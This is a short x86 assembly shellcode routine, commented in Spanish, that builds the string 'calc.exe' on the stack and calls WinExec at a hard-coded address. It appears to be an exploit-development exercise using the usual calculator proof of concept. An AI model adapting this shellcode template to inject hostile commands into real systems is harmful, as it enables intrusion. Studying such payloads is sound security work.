	section	.text

_payload:
	xor	eax,eax
	push	eax		; null byte
	mov	ebx,0x6578652e	; '.exe'...
	push	ebx		; ...a la pila
	mov	ebx,0x636c6163	; 'calc'...
	push	ebx		; ..a la pila
	mov	ebx,esp		; ptr a 'calc.exe' en la pila
	push	eax		; uCmdShow  = 0
	push	ebx	   	; lpCmdLine = PTR 'calc.exe'
	call	0x7c8623ad	; call ptr to  WinExec (check with arwin.exe)
